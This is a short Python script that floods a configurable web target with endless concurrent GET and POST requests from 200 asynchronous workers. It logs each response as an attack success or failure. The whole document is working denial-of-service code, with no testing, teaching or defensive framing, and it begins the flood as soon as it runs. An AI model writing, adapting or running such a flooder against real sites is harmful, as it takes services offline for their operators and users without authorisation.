import aiohttp
import asyncio
import random

target_ip = "url.com"
target_port = 80

threads = 200

cookies = {}

headers = {}

data = {}

async def attack():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                if random.randint(0, 1) == 0:
                    async with session.get(f"http://{target_ip}", headers=headers, cookies=cookies) as response:
                        handle_response(response)
                else:
                    async with session.post(f"http://{target_ip}", headers=headers, cookies=cookies, data=data) as response:
                        handle_response(response)
            except Exception as e:
                print(e)

def handle_response(response):
    if response.status != 200:
        print("Status:", response.status, "- Error in attack.")
    else:
        print("Status:", response.status, " - Attack successful.")

def start_attack():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [attack() for _ in range(threads)]
    loop.run_until_complete(asyncio.gather(*tasks))

start_attack()
